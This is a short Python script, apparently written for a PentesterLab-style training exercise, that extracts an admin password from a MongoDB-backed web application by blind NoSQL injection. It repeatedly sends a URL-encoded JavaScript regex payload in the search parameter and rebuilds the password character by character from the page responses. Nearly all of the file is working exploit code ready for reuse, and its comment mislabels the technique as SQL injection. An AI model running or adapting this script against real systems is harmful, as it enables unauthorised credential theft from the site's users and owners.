# This script will get a password match in MongoDB through BlindSQL

import urllib.request
import string

URL = "http://ptl-5643a299-a40cac12.libcurl.so"

def check(payload):
    url=URL+"/?search=admin%27%26%26%20this.password%20%26%26%20this.password.match(/"+payload+"/)%00"
    print(url)
    resp = urllib.request.urlopen(url)
    data = resp.read()
    return ">admin<" in str(data)

CHARSET=list("-"+string.ascii_lowercase+string.digits)
password=""

while True:
    for c in CHARSET:
        print("Trying: "+c+" for  "+password)
        test = password+c
        if check("^"+test+".*$"):
            password+=c
            print(password)
            break
        elif c == CHARSET[-1]:
            print(password)
            exit(0)
